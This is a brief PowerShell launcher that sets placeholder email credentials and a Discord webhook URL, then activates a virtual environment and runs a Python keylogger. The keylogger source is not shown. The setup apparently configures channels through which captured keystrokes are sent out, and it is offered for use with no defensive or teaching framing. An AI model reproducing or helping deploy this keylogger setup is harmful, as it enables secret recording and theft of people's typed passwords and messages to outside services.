# USER CONFIGURATION SECTION
# Fill these in with your own credentials

$env:EMAIL_SENDER = "your_email@gmail.com"
$env:EMAIL_PASSWORD = "your_app_password"
$env:DISCORD_WEBHOOK = "https://discord.com/api/webhooks/..."

# Activate virtual environment
.\env\Scripts\Activate.ps1

# Run your keylogger
python keylogger.py
